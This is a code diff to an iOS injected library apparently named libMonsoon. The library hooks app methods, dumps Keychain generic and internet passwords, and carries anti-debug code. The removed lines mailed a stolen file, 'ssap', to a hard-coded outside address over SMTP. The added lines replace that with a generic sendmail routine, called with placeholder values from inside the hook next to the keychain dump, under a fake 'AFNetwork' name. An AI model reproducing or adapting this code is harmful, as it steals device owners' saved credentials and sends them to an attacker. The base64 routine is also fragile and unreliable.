@@ -21,26 +21,8 @@
 #include <unistd.h>
 #include <sys/sysctl.h>
 #include <stdlib.h>
+#include <arpa/inet.h>
 //#include <sys/ptrace.h>
-
-
-#define EHLO "helo ha\r\n" //***为邮箱用户名
-#define DATA "data\r\n"
-#define QUIT "QUIT\r\n"
-
-//#define h_addr h_addr_list[0]
-//FILE *fin;
-int sock;
-struct sockaddr_in server;
-struct hostent *hp, *gethostbyname();
-char buf[BUFSIZ+1];
-int len;
-char *host_id="smtp.126.com";
-//char *from_id="1050647543@qq.com";
-char *to_id="Mr_jimmyhacker@163.com";
-char *sub="ssap";
-char *wkstr;
-
 
 #pragma mark - Keychain Prototype Function
 
@@ -337,7 +319,7 @@ void printResultsForSecClass(NSArray *keychainItems, CFTypeRef kSecClassType) {
 }
 
 
-//-----------------------------------
+#pragma mark - Anit Debug
 
 static int is_being_debugging(void)
 {
@@ -363,232 +345,198 @@ static int is_being_debugging(void)
 
 
 
-//---------
-#pragma MailSending
-char base64Alphabet[]=
-{'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P',
-    'Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f',
-    'g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v',
-    'w','x','y','z','0','1','2','3','4','5','6','7','8','9','+','/','='};
+#pragma mark - Send Mail
 
-unsigned char* base64Encode(const char* source, const int sourceLength)
+struct data6  {
+    unsigned int d4:6;
+    unsigned int d3:6;
+    unsigned int d2:6;
+    unsigned int d1:6;
+};
+
+char con628(char c6);
+void base64(char *dbuf,char *buf128,int len);
+int open_socket(struct sockaddr *addr);
+void sendmail(const char *username,const char *password,const char *email,const char *smtp,const char *subject,const char *body);
+
+char con628(char c6)
 {
-    /*命名为padding不准确，不过先不改了^_^*/
-    unsigned int padding = sourceLength%3;
-    unsigned int resultLength = sourceLength%3 ? ((sourceLength)/3 + 1)*4 : (sourceLength)/3*4;
-    unsigned int i=0, j=0;
-    
-    unsigned char* result = (unsigned char*)malloc(resultLength + 1);
-    memset(result, 0, resultLength+1);
-    
-    unsigned char temp = 0;
-    for (i=0,j=0; i<sourceLength; i+=3, j+=4)
-    {
-        if (i+2 >= sourceLength)
-        {
-            result[j] = (source[i]>>2) & 0x3F;
-            if (padding==1)
-            {
-                //这里padding实际为2
-                result[j+1] = ((source[i] & 0x03)<<4 ) & 0x3F;
-                result[j+2] = 0x40;
-                result[j+3] = 0x40;
-                break;
-            }
-            else if (padding==2)
-            {
-                //这里padding实际为1
-                result[j+1] = (((source[i] & 0x03)<<4) | ((source[i+1]>>4) & 0x0F));
-                result[j+2] = ((source[i+1] & 0x0f)<<2) & 0x3F;
-                result[j+3] = 0x40;
-                break;
-            }
-        }
-        
-        result[j] = (source[i]>>2) & 0x3F;//最高两位要变为0
-        result[j+1] = (((source[i] & 0x03)<<4) | ((source[i+1]>>4) & 0x0F));//0x03（只取最低两位,其余位为0） 0x0F(只取低四位，其余位为0)
-        result[j+2] = (((source[i+1] & 0x0f)<<2) | ((source[i+2]>>6) & 0x03));
-        result[j+3] = (source[i+2] & 0x3F);
-    }
-    
-    for ( j=0; j<resultLength; ++j)
-    {
-        result[j] = base64Alphabet[result[j]];
-    }
-    
-    return result;
+    char rtn = '\0';
+    if (c6 < 26) rtn = c6 + 65;
+    else if (c6 < 52) rtn = c6 + 71;
+    else if (c6 < 62) rtn = c6 - 4;
+    else if (c6 == 62) rtn = 43;
+    else rtn = 47;
+    return rtn;
 }
 
-/*=====Send a string to the socket=====*/
-void send_socket(char *s)
-{
-	write(sock,s,strlen(s));
-	//write(1,s,strlen(s));
-	//printf("Client:%s\n",s);
+void base64(char *dbuf, char *buf128, int len) {
+    struct data6 *ddd = NULL;
+    int i = 0;
+    char buf[256] = {0};
+    char *tmp = NULL;
+    char cc = '\0';
+    memset(buf, 0, 256);
+    strcpy(buf, buf128);
+    for(i = 1; i <= len/3; i++)
+    {
+        tmp = buf+(i-1)*3;
+        cc = tmp[2];
+        tmp[2] = tmp[0];
+        tmp[0] = cc;
+        ddd = (struct data6 *)tmp;
+        dbuf[(i-1)*4+0] = con628((unsigned int)ddd->d1); dbuf[(i-1)*4+1] = con628((unsigned int)ddd->d2); dbuf[(i-1)*4+2] = con628((unsigned int)ddd->d3); dbuf[(i-1)*4+3] = con628((unsigned int)ddd->d4); }
+    if(len%3 == 1)
+    {
+        tmp = buf+(i-1)*3;
+        cc = tmp[2];
+        tmp[2] = tmp[0];
+        tmp[0] = cc;
+        ddd = (struct data6 *)tmp;
+        dbuf[(i-1)*4+0] = con628((unsigned int)ddd->d1); dbuf[(i-1)*4+1] = con628((unsigned int)ddd->d2); dbuf[(i-1)*4+2] = '=';
+        dbuf[(i-1)*4+3] = '=';
+    }
+    if(len%3 == 2)
+    {
+        tmp = buf+(i-1)*3;
+        cc = tmp[2];
+        tmp[2] = tmp[0];
+        tmp[0] = cc;
+        ddd = (struct data6 *)tmp;
+        dbuf[(i-1)*4+0] = con628((unsigned int)ddd->d1); dbuf[(i-1)*4+1] = con628((unsigned int)ddd->d2); dbuf[(i-1)*4+2] = con628((unsigned int)ddd->d3); dbuf[(i-1)*4+3] = '=';
+    }
+    return;
 }
 
-//=====Read a string from the socket=====*/
-void read_socket()
-{
-	len = read(sock,buf,BUFSIZ);
-	write(1,buf,len);
-	//printf("Server:%s\n",buf);
-}
-
-char * ReadFile(char * path, int *length)
-{
-    FILE * pfile;
-    char * data;
+void sendmail(const char *username,const char *password,const char *email,const char *smtp,const char *subject,const char *body) {
+    int sockfd = 0;
+    struct sockaddr_in their_addr = {0};
+    char buf[1500] = {0};
+    char rbuf[1500] = {0};
+    char login[128] = {0};
+    char pass[128] = {0};
+    memset(&their_addr, 0, sizeof(their_addr));
+    their_addr.sin_family = AF_INET;
+    their_addr.sin_port = htons(25);
     
-    pfile = fopen(path, "rb");
-    if (pfile == NULL)
-    {
-        return NULL;
-    }
-    fseek(pfile, 0, SEEK_END);
-    *length = ftell(pfile);
-    data = (char *)malloc((*length + 1) * sizeof(char));
-    rewind(pfile);
-    *length = fread(data, 1, *length, pfile);
-    data[*length] = '\0';
-    fclose(pfile);
-    return data;
-}
-
-inline int send_mail() {
-    FILE *fp;
-    fp = fopen("./ssap","rw");
-    char output;
-    output = fgetc(fp);
-    int i = 1;
-    while (output!=EOF)
-    {
-        output = fgetc(fp);
-        //sprintf(wkstr,"%c",output);
-        i++;
-    }
-    wkstr = (char *)malloc((i + 1) * sizeof(char));
-    
-    FILE *fp2;
-    fp2 = fopen("./ssap","rw");
-    char writeC;
-    writeC = fgetc(fp2);
-    sprintf(wkstr,"%s%c",wkstr,writeC);
-    
-    while (writeC!=EOF)
-    {
-        writeC = fgetc(fp2);
-        sprintf(wkstr,"%s%c",wkstr,writeC);
-    }
-    
-    wkstr = base64Encode(wkstr,strlen(wkstr));
-    
-    //system("rm -f ./ssap");
-    //system("rm -f ./repmud");
-	/*=====Create Socket=====*/
-	sock = socket(AF_INET, SOCK_STREAM, 0);
-	if (sock==-1)
-	{
-		//perror("opening stream socket");
-		//exit(1);
-		return 1;
-	}
-	else
-		//cout << "socket created\n";
-		//printf("socket created\n");
-        
-	/*=====Verify host=====*/
-        server.sin_family = AF_INET;
-	hp = gethostbyname(host_id);
+    struct hostent *hp;
+	hp = gethostbyname(smtp);
 	if (hp==(struct hostent *) 0)
 	{
-		//fprintf(stderr, "%s: unknown host\n", host_id);
-		//exit(2);
-		return 2;
+        return;
 	}
-    
-	/*=====Connect to port 25 on remote host=====*/
-	memcpy((char *) &server.sin_addr, (char *) hp->h_addr, hp->h_length);
-	server.sin_port=htons(25); /* SMTP PORT */
-	if (connect(sock, (struct sockaddr *) &server, sizeof server)==-1)
-	{
-		//perror("connecting stream socket");
-		//exit(1);
-		return 1;
-	}
-	else
-		//cout << "Connected\n";
-		//printf("Connected\n");
-        
-	/*=====Write some data then read some =====*/
-        read_socket(); /* SMTP Server logon string */
-	send_socket(EHLO); /* introduce ourselves */
-	read_socket(); /*Read reply */
-    
-	send_socket("auth login");
-	send_socket("\r\n");
-	read_socket();
-    
-    char *username = "mr_jimmyhacker@126.com";
-    username = base64Encode(username,strlen(username));
-    
-    char *password = ""/*密码不能告诉你*/;
-    password = base64Encode(password,strlen(password));
-    
-    send_socket(username);
-    send_socket("\r\n");
-    read_socket();
-    
-    send_socket(password);
-    send_socket("\r\n");
-    read_socket();
-    
-	send_socket("mail from: ");
-    send_socket("mr_jimmyhacker@126.com");
-	send_socket("\r\n");
-	read_socket(); /* Sender OK */
-    
-	//send_socket("VRFY ");
-	//send_socket(from_id);
-	//send_socket("\r\n");
-	//read_socket(); // Sender OK */
-	send_socket("rcpt to: "); /*Mail to*/
-	send_socket(to_id);
-	//send_socket(">");
-	send_socket("\r\n");
-	read_socket(); // Recipient OK*/
-    
-	send_socket(DATA);// body to follow*/
-	//read_socket();
-	//send_socket("from:***@126.com");
-	send_socket("subject: ");
-	send_socket(sub);
-    send_socket("\r\n");
-    send_socket("Content-Type: multipart/mixed; boundary=a\r\n");
-    send_socket("--a\r\n");
-    send_socket("--a\r\n");
-    send_socket("Content-Disposition: attachment; filename=\"ssap.txt\"\r\n");
-    send_socket("Content-Transfer-Encoding: base64\r\n\r\n");
-    //printf("%d",i);
-    
-    //printf("%s",wkstr);
-	send_socket(wkstr);
-    free(wkstr);
-    send_socket("--a--");
-	send_socket("\r\n.\r\n");
-	read_socket();
-	send_socket(QUIT); /* quit */
-	read_socket(); // log off */
-    
-	//=====Close socket and finish=====*/
-	close(sock);
-	//exit(0);
-	return 0;
-    
+    memcpy((char *) &their_addr.sin_addr, (char *) hp->h_addr, hp->h_length);
+    their_addr.sin_addr.s_addr = inet_addr(smtp);
+    sockfd = open_socket((struct sockaddr *)&their_addr);
+    memset(rbuf,0,1500);
+    while(recv(sockfd, rbuf, 1500, 0) == 0)
+    {
+        printf("reconnect...\n");
+        sleep(2);
+        sockfd = open_socket((struct sockaddr *)&their_addr);
+        memset(rbuf,0,1500);
+    }
+    printf("%s\n", rbuf);
+    // EHLO
+    memset(buf, 0, 1500);
+    sprintf(buf, "EHLO localhost.localdomain\r\n");
+    send(sockfd, buf, strlen(buf), 0);
+    memset(rbuf, 0, 1500);
+    recv(sockfd, rbuf, 1500, 0);
+    printf("%s\n", rbuf);
+    // AUTH LOGIN
+    memset(buf, 0, 1500);
+    sprintf(buf, "AUTH LOGIN\r\n");
+    send(sockfd, buf, strlen(buf), 0);
+    printf("%s\n", buf);
+    memset(rbuf, 0, 1500);
+    recv(sockfd, rbuf, 1500, 0);
+    printf("%s\n", rbuf);
+    // USER
+    memset(buf, 0, 1500);
+    sprintf(buf,"%s",username);
+    memset(login, 0, 128);
+    base64(login, buf, [[NSString stringWithFormat:@"%zu",strlen(buf)] intValue]);
+    sprintf(buf, "%s\r\n", login);
+    send(sockfd, buf, strlen(buf), 0);
+    printf("%s\n", buf);
+    memset(rbuf, 0, 1500);
+    recv(sockfd, rbuf, 1500, 0);
+    printf("%s\n", rbuf);
+    // PASSWORD
+    sprintf(buf, "%s",password);
+    base64(pass, buf, [[NSString stringWithFormat:@"%zu",strlen(buf)] intValue]);
+    sprintf(buf, "%s\r\n", pass);
+    send(sockfd, buf, strlen(buf), 0);
+    printf("%s\n", buf);
+    memset(rbuf, 0, 1500);
+    recv(sockfd, rbuf, 1500, 0);
+    printf("%s\n", rbuf);
+    // MAIL FROM
+    memset(buf, 0, 1500);
+    sprintf(buf, "MAIL FROM:<%s>\r\n",username);
+    send(sockfd, buf, strlen(buf), 0);
+    memset(rbuf, 0, 1500);
+    recv(sockfd, rbuf, 1500, 0);
+    printf("%s\n", rbuf);
+    // RCPT TO
+    memset(buf, 0, 1500);
+    sprintf(buf, "RCPT TO:<%s>\r\n", email);
+    send(sockfd, buf, strlen(buf), 0);
+    memset(rbuf, 0, 1500);
+    recv(sockfd, rbuf, 1500, 0);
+    printf("%s\n", rbuf);
+    // DATA
+    memset(buf, 0, 1500);
+    sprintf(buf, "DATA\r\n");
+    send(sockfd, buf, strlen(buf), 0);
+    memset(rbuf, 0, 1500);
+    recv(sockfd, rbuf, 1500, 0);
+    printf("%s\n", rbuf);
+    //TO
+    memset(buf, 0, 1500);
+    sprintf(buf, "TO:%s\r\n",email);
+    send(sockfd, buf, strlen(buf), 0);
+    //FROM
+    memset(buf, 0, 1500);
+    sprintf(buf, "FROM:%s\r\n",username);
+    send(sockfd, buf, strlen(buf), 0);
+    //subject
+    memset(buf, 0, 1500);
+    sprintf(buf, "Subject: %s\r\n\r\n", subject);
+    send(sockfd, buf, strlen(buf), 0);
+    memset(buf, 0, 1500);
+    sprintf(buf, "%s\r\n", body);
+    send(sockfd, buf, strlen(buf), 0);
+    memset(buf, 0, 1500);
+    sprintf(buf, ".\r\n");
+    send(sockfd, buf, strlen(buf), 0);
+    memset(rbuf, 0, 1500);
+    recv(sockfd, rbuf, 1500, 0);
+    printf("%s\n", rbuf);
+    // QUIT
+    memset(buf, 0, 1500);
+    sprintf(buf, "QUIT\r\n");
+    send(sockfd, buf, strlen(buf), 0);
+    memset(rbuf, 0, 1500);
+    recv(sockfd, rbuf, 1500, 0);
+    printf("%s\n", rbuf);
+    return;
 }
 
+int open_socket(struct sockaddr *addr) {
+    int sockfd = 0;
+    sockfd=socket(PF_INET, SOCK_STREAM, 0); if(sockfd < 0)
+    {
+        fprintf(stderr, "Open sockfd(TCP) error!\n"); exit(-1);
+    }
+    if(connect(sockfd, addr, sizeof(struct sockaddr)) < 0) {
+        fprintf(stderr, "Connect sockfd(TCP) error!\n"); exit(-1);
+    }
+    return sockfd;
+}
 
-//------------------------------------
+#pragma mark - AFNetwork(伪)
 
 @implementation AFNetwork
 
@@ -680,6 +628,10 @@ static IMP sOriginalImp = NULL;
     
     //UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"INJECTED" message:@"Method has been replaced by objc_runtime dynamic library\nDYLD_INSERT_LIBRARIES=libMonsoon.dylib" delegate:nil cancelButtonTitle:@"OK" otherButtonTitles: nil];
     //[alert show];
+    
+    sendmail("username","password","mailto","smtp","subject","mail content");
+    
+
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
         printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassGenericPassword), (CFTypeRef)(id)kSecClassGenericPassword);
         printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassInternetPassword), (CFTypeRef)(id)kSecClassInternetPassword);
